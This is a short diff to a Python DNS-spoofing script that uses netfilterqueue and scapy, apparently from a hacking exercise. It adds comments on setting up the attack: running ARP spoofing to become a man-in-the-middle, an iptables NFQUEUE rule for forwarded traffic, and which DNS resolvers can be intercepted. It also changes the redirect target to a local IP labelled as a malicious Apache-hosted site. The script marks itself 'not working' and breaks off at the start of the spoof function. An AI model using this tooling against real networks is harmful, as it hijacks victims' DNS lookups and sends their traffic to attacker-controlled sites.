@@ -1,9 +1,13 @@
 # NOT WORKING currently
+# interceptable DNS resolvers - local resolvers, public DNS servers if not encrypted
+# cannot intercept DoH DoT traffic
+# run arp spoofing and establish yourself as MITM
+# configure nfqueue - sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
 
 import netfilterqueue
 import scapy.all
 
-address = "142.250.4.101"  # Redirect target IP
+address = "192.168.1.35"  # Redirect target IP (malicious website hosted using apache)
 
 def spoof(packet):
     scapy_packet = scapy.all.IP(packet.get_payload())
